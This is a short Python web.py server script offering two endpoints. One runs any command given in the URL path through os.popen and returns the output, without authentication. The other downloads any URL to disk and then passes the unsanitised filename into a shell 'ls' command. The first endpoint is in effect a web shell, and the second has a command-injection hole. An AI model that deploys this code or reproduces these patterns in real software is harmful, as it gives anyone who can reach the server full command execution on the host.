import web

urls = (
    '/bash/(.*)','bash',
    '/download/(.*)','download',
    )

app = web.application(urls, globals())

class bash:
    def GET(self,command ):
        import os
        tmp = os.popen(command).read() 
        return tmp

class download:
    def GET(self,address ):
        '''address = "http://192.168.0.1|1.txt"'''
        address = address.replace('|','/')

        import urllib
        data = urllib.urlopen(address).read()

        filename = address.split('/')[-1]
        f = open('downloaded_data/'+filename,'w')
        f.write(data)
        f.close()

        import os
        tmp = os.popen('ls downloaded_data/'+filename).read() 
        return tmp

if __name__ == '__main__':
    app.run()
